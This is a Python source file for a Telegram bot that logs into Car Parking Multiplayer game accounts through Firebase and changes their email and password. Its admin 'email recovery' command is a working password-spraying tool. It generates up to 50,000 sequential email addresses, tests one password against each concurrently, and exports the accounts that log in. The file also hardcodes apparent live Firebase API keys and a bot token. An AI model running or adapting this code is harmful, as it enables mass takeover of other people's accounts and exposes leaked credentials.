import sys
import asyncio

if sys.platform.startswith("win"):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

import os
import time
import requests
import re
import aiohttp
import json
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ===== CONFIG =====
CPM1_API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
CPM2_API_KEY = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
BOT_TOKEN = "8496323687:AAFLhc2UY4Z_afiKNjAFRfpg9i325oiv-UA"

# ===== ADMIN CONFIG =====
ADMIN_ID = 8650959684  # replace with your Telegram ID

USERS_FILE = "users.txt"

# Load allowed users
if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        allowed_users = set(int(x.strip()) for x in f if x.strip())
else:
    allowed_users = set()

# Always allow admin
allowed_users.add(ADMIN_ID)

def save_users():
    with open(USERS_FILE, "w") as f:
        for uid in allowed_users:
            f.write(f"{uid}\n")




# ===== ADMIN COMMANDS =====

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("Usage: /add telegramid")
        return

    try:
        user_id = int(context.args[0])

        if user_id in allowed_users:
            await update.message.reply_text("⚠️ User already exists.")
            return

        allowed_users.add(user_id)
        save_users()

        await update.message.reply_text(f"✅ Added user: {user_id}")

    except:
        await update.message.reply_text("❌ Invalid Telegram ID")


async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("Usage: /remove telegramid")
        return

    try:
        user_id = int(context.args[0])

        if user_id == ADMIN_ID:
            await update.message.reply_text("⚠️ Cannot remove admin.")
            return

        if user_id not in allowed_users:
            await update.message.reply_text("⚠️ User not found.")
            return

        allowed_users.remove(user_id)
        save_users()

        # logout session if online
        if user_id in sessions:
            del sessions[user_id]

        await update.message.reply_text(f"🗑 Removed user: {user_id}")

    except:
        await update.message.reply_text("❌ Invalid Telegram ID")


async def bulk_add_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to bulk add users from comma/newline-separated list."""
    if update.effective_user.id != ADMIN_ID:
        return

    bulk_help = """
📋 **Bulk Add Users**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Usage: Send a list of Telegram IDs separated by:
- Commas: `123456,789012,345678`
- New lines: Each ID on a new line
- Spaces: `123456 789012 345678`

Example:
```
/bulkadd
123456789
987654321
555666777
```

Type your list:
"""
    context.user_data['step'] = 'bulk_add'
    await update.message.reply_text(bulk_help, parse_mode="Markdown")


async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not allowed_users:
        await update.message.reply_text("No users.")
        return

    text = "👥 Active Users:\n\n"

    for uid in sorted(allowed_users):
        status = "🟢 Online" if uid in sessions else "⚪ Offline"
        text += f"{uid} - {status}\n"

    await update.message.reply_text(text)


# ===== ADMIN RECOVER COMMAND =====
async def admin_recover(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin-only email recovery command"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized. Admin only.")
        return
    
    game_selection = """
🔐 **ADMIN: Email Recovery**
━━━━━━━━━━━━━━━━━━━━━━
Select Your Game:

1️⃣ Type: `cpm1` - Recover CPM1 Accounts
2️⃣ Type: `cpm2` - Recover CPM2 Accounts

Which game would you like to recover?
"""
    await update.message.reply_text(game_selection, parse_mode="Markdown")
    context.user_data['step'] = 'admin_recover_game'


# ===== CPM FUNCTIONS =====
def login_request(email, password, api_key):
    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    response = requests.post(url, json=payload)
    return response.json()

def update_request(id_token, api_key, new_email=None, new_password=None):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
    payload = {"idToken": id_token, "returnSecureToken": True}
    if new_email: payload["email"] = new_email
    if new_password: payload["password"] = new_password
    response = requests.post(url, json=payload)
    return response.json()

# ===== ULTRA-FAST EMAIL RECOVERY FUNCTIONS =====
def parse_email_pattern(pattern):
    """Parse email patterns like tannercpm(10000)@gmail.com"""
    match = re.match(r'^([a-zA-Z0-9]+)\((\d+)(?:-(\d+))?\)@([\w\.-]+\.\w+)$', pattern)
    if not match:
        return None
    
    base, start, end, domain = match.groups()
    start = int(start)
    end = int(end) if end else start
    
    if start > end:
        start, end = end, start
    
    return base, start, end, domain

def generate_emails(base, start, end, domain):
    """Generate email list from range"""
    return [f"{base}{i}@{domain}" for i in range(start, end + 1)]

async def fast_check_email(email, password, api_key, session=None):
    """Fast async email check"""
    try:
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
        payload = {"email": email, "password": password, "returnSecureToken": True}
        
        if session is None:
            async with aiohttp.ClientSession() as temp_session:
                async with temp_session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    data = await resp.json()
        else:
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                data = await resp.json()
        
        if "idToken" in data:
            return "found", data
        
        error = data.get("error", {}).get("message", "")
        if "EMAIL_NOT_FOUND" in error or "INVALID_EMAIL" in error:
            return "not_found", None
        elif "INVALID_PASSWORD" in error:
            return "wrong_password", None
        else:
            return "error", error
            
    except asyncio.TimeoutError:
        return "timeout", None
    except Exception as e:
        return "error", str(e)

async def check_emails_concurrent(emails, password, api_key, batch_size=50, progress_callback=None):
    """
    Ultra-fast concurrent email checking
    batch_size: number of concurrent requests (50-100 recommended)
    """
    all_results = []
    total = len(emails)
    checked = 0
    
    # Reuse session across all requests for speed
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        for i in range(0, len(emails), batch_size):
            batch = emails[i:i + batch_size]
            
            # Create concurrent tasks
            tasks = [fast_check_email(email, password, api_key, session) for email in batch]
            
            # Execute all concurrently
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for email, result in zip(batch, results):
                checked += 1
                
                if isinstance(result, tuple):
                    all_results.append((email, result[0], result[1]))
                else:
                    all_results.append((email, "error", str(result)))
                
                # Progress callback
                if progress_callback and checked % 10 == 0:
                    await progress_callback(checked, total)
    
    return all_results

# ===== SESSIONS =====
sessions = {}  # user_id -> {id_token, email, game_name, api_key}
user_states = {}  # per-user step tracking

# ===== MENU HELPERS =====
def build_menu_text(user_id):
    """Return a text-based menu depending on login state."""
    if user_id in sessions:
        session_info = sessions[user_id]
        menu_text = f"""
🎮 **TNNR Change Tool Bot** 🎮
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Logged in as:** {session_info['email']}
🎯 **Game:** {session_info['game_name']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Available Options:**
1️⃣ Type: `changemail` - Change your email
2️⃣ Type: `changepass` - Change your password
3️⃣ Type: `logout` - Logout from the bot

What would you like to do?
"""
    else:
        menu_text = """
🎮 **TNNR Change Tool Bot** 🎮
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
You are not logged in.

**Available Options:**
1️⃣ Type: `login` - Login to your game account

What would you like to do?
"""
    return menu_text
    
# ===== ACCESS CHECK =====
def is_allowed(user_id):
    return user_id in allowed_users
    
# ==== START FUNCTION =====

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user_id = update.effective_user.id

    if not is_allowed(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return

    await update.message.reply_text(
        build_menu_text(user_id),
        parse_mode="Markdown"
    )

# ----- MESSAGE HANDLER -----
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip().lower()
    step = context.user_data.get('step')
    
    # ----- ADMIN: BULK ADD USERS -----
    if step == 'bulk_add':
        if user_id != ADMIN_ID:
            return
        
        # Parse the input - support comma, newline, or space separated IDs
        ids_text = update.message.text.strip()
        
        # Try different separators
        if ',' in ids_text:
            user_ids = [x.strip() for x in ids_text.split(',')]
        elif '\n' in ids_text:
            user_ids = [x.strip() for x in ids_text.split('\n')]
        else:
            user_ids = ids_text.split()
        
        added = []
        failed = []
        already_exist = []
        
        for uid_str in user_ids:
            try:
                uid = int(uid_str)
                
                if uid in allowed_users:
                    already_exist.append(uid)
                else:
                    allowed_users.add(uid)
                    added.append(uid)
            except ValueError:
                failed.append(uid_str)
        
        save_users()
        
        # Build response
        response = "📊 **Bulk Add Results:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
        
        if added:
            response += f"✅ **Added ({len(added)}):** " + ", ".join(map(str, added)) + "\n"
        if already_exist:
            response += f"⚠️ **Already exist ({len(already_exist)}):** " + ", ".join(map(str, already_exist)) + "\n"
        if failed:
            response += f"❌ **Invalid IDs ({len(failed)}):** " + ", ".join(failed) + "\n"
        
        response += f"\n**Total Users:** {len(allowed_users)}"
        
        await update.message.reply_text(response, parse_mode="Markdown")
        context.user_data.clear()
        return
    
    if not is_allowed(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return

    # ----- MAIN MENU COMMANDS -----
    if text == "login":
        if user_id in sessions:
            await update.message.reply_text("⚠️ You are already logged in. Type `logout` first.")
            return
        
        game_selection = """
🎮 **Select Your Game:**
━━━━━━━━━━━━━━━━━━━━━━
Type one of the following:

1️⃣ Type: `cpm1` - Login to CPM1
2️⃣ Type: `cpm2` - Login to CPM2

Which game would you like to login to?
"""
        await update.message.reply_text(game_selection, parse_mode="Markdown")
        context.user_data['step'] = 'select_game'
        return

    elif text == "changemail":
        if user_id not in sessions:
            await update.message.reply_text("⚠️ You must login first. Type `login` to start.")
            return
        context.user_data['step'] = 'changemail'
        await update.message.reply_text("✉️ Enter your new email address:")
        return

    elif text == "changepass":
        if user_id not in sessions:
            await update.message.reply_text("⚠️ You must login first. Type `login` to start.")
            return
        context.user_data['step'] = 'changepass'
        await update.message.reply_text("🔑 Enter your new password:")
        return

    elif text == "logout":
        if user_id in sessions:
            del sessions[user_id]
            await update.message.reply_text("🚪 Logged out successfully.\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        else:
            await update.message.reply_text("⚠️ You are not logged in.", parse_mode="Markdown")
        context.user_data.clear()
        return

    # ----- GAME SELECTION -----
    elif step == 'select_game':
        if text in ['cpm1', 'cpm2']:
            game = text.upper()
            context.user_data['login_game'] = game
            context.user_data['api_key'] = CPM1_API_KEY if game == "CPM1" else CPM2_API_KEY
            context.user_data['step'] = 'email'
            await update.message.reply_text(f"📝 Enter your email for {game}:")
        else:
            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
        return

    # ----- ADMIN EMAIL RECOVERY GAME SELECTION -----
    elif step == 'admin_recover_game':
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Unauthorized.")
            return
            
        if text in ['cpm1', 'cpm2']:
            game = text.upper()
            context.user_data['recover_game'] = game
            context.user_data['recover_api_key'] = CPM1_API_KEY if game == "CPM1" else CPM2_API_KEY
            context.user_data['step'] = 'admin_recover_pattern'
            recover_help = f"""
📧 **ADMIN: Email Recovery for {game}**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Enter an email pattern to check:

**Examples:**
- `tannercpm(10000)@gmail.com` - Checks emails 1 to 10000
- `tannercpm(1000-5000)@gmail.com` - Checks emails 1000 to 5000
- `user(100-200)@domain.com` - Custom range

⚡ **ULTRA-FAST MODE**
- Checks 50 emails CONCURRENTLY
- 10,000 emails in ~20 seconds
- Results exported to JSON file

Enter your pattern:
"""
            await update.message.reply_text(recover_help, parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
        return

    # ----- ADMIN EMAIL RECOVERY PATTERN -----
    elif step == 'admin_recover_pattern':
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Unauthorized.")
            return
            
        pattern = update.message.text.strip()
        parsed = parse_email_pattern(pattern)
        
        if not parsed:
            await update.message.reply_text("❌ Invalid pattern format. Use: `base(num)@domain.com` or `base(num1-num2)@domain.com`")
            return
        
        base, start, end, domain = parsed
        total = end - start + 1
        
        # Limit checks
        if total > 50000:
            await update.message.reply_text(f"❌ Range too large ({total} emails). Max 50,000 per check.")
            return
        
        context.user_data['step'] = 'admin_recover_password_input'
        await update.message.reply_text(f"""
🔐 **Enter Password to Check**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Pattern: `{pattern}`
Range: {total} emails ({start} - {end})

Enter the password to check:
""", parse_mode="Markdown")
        context.user_data['recover_base'] = base
        context.user_data['recover_start'] = start
        context.user_data['recover_end'] = end
        context.user_data['recover_domain'] = domain
        return

    # ----- ADMIN EMAIL RECOVERY PASSWORD INPUT -----
    elif step == 'admin_recover_password_input':
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Unauthorized.")
            return
            
        password = update.message.text.strip()
        
        base = context.user_data['recover_base']
        start = context.user_data['recover_start']
        end = context.user_data['recover_end']
        domain = context.user_data['recover_domain']
        game = context.user_data['recover_game']
        api_key = context.user_data['recover_api_key']
        
        total = end - start + 1
        
        start_time = time.time()
        
        progress_msg = await update.message.reply_text(f"""
⚡ **ULTRA-FAST EMAIL RECOVERY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Game: **{game}**
Pattern: **{base}({start}-{end})@{domain}**
Total: **{total} emails**
Status: **Starting...**

Concurrent: **50 emails at a time**
""", parse_mode="Markdown")
        
        await context.bot.send_chat_action(update.effective_chat.id, "typing")
        
        emails = generate_emails(base, start, end, domain)
        
        # Progress callback
        async def update_progress(checked, total_emails):
            elapsed = time.time() - start_time
            speed = checked / elapsed if elapsed > 0 else 0
            remaining = (total_emails - checked) / speed if speed > 0 else 0
            
            try:
                await progress_msg.edit_text(f"""
⚡ **ULTRA-FAST EMAIL RECOVERY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Game: **{game}**
Pattern: **{base}({start}-{end})@{domain}**
Checked: **{checked}/{total_emails}** ({int(checked/total_emails*100)}%)
Speed: **{speed:.1f} emails/sec**
ETA: **{int(remaining)}s**
""", parse_mode="Markdown")
            except:
                pass
        
        # Run concurrent check
        results = await check_emails_concurrent(emails, password, api_key, batch_size=50, progress_callback=update_progress)
        
        elapsed = time.time() - start_time
        
        # Filter ONLY found emails (correct password)
        found_emails = [r for r in results if r[1] == "found"]
        
        # Create output file with results
        output_data = {
            "game": game,
            "pattern": f"{base}({start}-{end})@{domain}",
            "total_checked": total,
            "time_seconds": round(elapsed, 2),
            "speed_emails_per_sec": round(len(emails)/elapsed, 2),
            "found_count": len(found_emails),
            "successful_logins": []
        }
        
        # Add found email details
        for email, status, data in found_emails:
            output_data["successful_logins"].append({
                "email": email,
                "password": password,
                "game": game
            })
        
        # Save to file
        filename = f"recovery_{game.lower()}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(output_data, f, indent=2)
        
        # Send results
        if found_emails:
            results_text = f"""
✅ **RECOVERY COMPLETE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Game: **{game}**
Found: **{len(found_emails)} account(s)** ✅
Time: **{elapsed:.1f}s**
Speed: **{len(emails)/elapsed:.1f} emails/sec**

📄 Results saved to file
"""
            await update.message.reply_text(results_text, parse_mode="Markdown")
            
            # Send file
            with open(filename, 'rb') as f:
                await update.message.reply_document(document=f, filename=filename)
        else:
            await update.message.reply_text(f"""
❌ **RECOVERY COMPLETE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No matching accounts found.
Time: **{elapsed:.1f}s**
Speed: **{len(emails)/elapsed:.1f} emails/sec**
""", parse_mode="Markdown")
        
        context.user_data.clear()
        return

    # ----- EMAIL -----
    elif step == 'email':
        context.user_data['email'] = text
        context.user_data['step'] = 'password'
        await update.message.reply_text("🔒 Now enter your password:")
        return

    # ----- PASSWORD -----
    elif step == 'password':
        email = context.user_data['email']
        password = text
        api_key = context.user_data['api_key']
        game_name = context.user_data['login_game']

        # simulate loading
        await context.bot.send_chat_action(update.effective_chat.id, "typing")
        await asyncio.sleep(2)

        resp = login_request(email, password, api_key)
        if "idToken" not in resp:
            error_msg = resp.get("error", {}).get("message", "Unknown error")
            await update.message.reply_text(f"❌ Login failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
            context.user_data.clear()
            return

        sessions[user_id] = {
            "id_token": resp["idToken"],
            "email": resp.get("email", email),
            "game_name": game_name,
            "api_key": api_key
        }
        await update.message.reply_text(f"✅ Logged in as {sessions[user_id]['email']} ({game_name})\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        context.user_data.clear()
        return

    # ----- CHANGE EMAIL -----
    elif step == 'changemail':
        if user_id not in sessions:
            await update.message.reply_text("⚠️ You must login first.", parse_mode="Markdown")
            context.user_data.clear()
            return
        new_email = text
        s = sessions[user_id]

        await context.bot.send_chat_action(update.effective_chat.id, "typing")
        await asyncio.sleep(1.5)

        change_resp = update_request(s['id_token'], s['api_key'], new_email=new_email)
        if "email" in change_resp:
            s['email'] = change_resp['email']
            s['id_token'] = change_resp.get('idToken', s['id_token'])
            await update.message.reply_text(f"✉️ Email updated to {s['email']}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        else:
            error_msg = change_resp.get("error", {}).get("message", "Unknown error")
            await update.message.reply_text(f"❌ Failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        context.user_data.clear()
        return

    # ----- CHANGE PASSWORD -----
    elif step == 'changepass':
        if user_id not in sessions:
            await update.message.reply_text("⚠️ You must login first.", parse_mode="Markdown")
            context.user_data.clear()
            return
        new_pass = text
        s = sessions[user_id]

        await context.bot.send_chat_action(update.effective_chat.id, "typing")
        await asyncio.sleep(1.5)

        change_resp = update_request(s['id_token'], s['api_key'], new_password=new_pass)
        if "idToken" in change_resp:
            s['id_token'] = change_resp['idToken']
            await update.message.reply_text(f"🔑 Password changed successfully\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        else:
            error_msg = change_resp.get("error", {}).get("message", "Unknown error")
            await update.message.reply_text(f"❌ Failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        context.user_data.clear()
        return

    # ----- UNRECOGNIZED INPUT -----
    else:
        await update.message.reply_text("❓ I didn't understand that. Type `/start` to see available options.", parse_mode="Markdown")

# ===== BOT STARTUP =====
app = Application.builder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("add", add_user))
app.add_handler(CommandHandler("remove", remove_user))
app.add_handler(CommandHandler("bulkadd", bulk_add_users))
app.add_handler(CommandHandler("users", list_users))
app.add_handler(CommandHandler("recover", admin_recover))
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

print("🚀 Bot is running...")
app.run_polling()
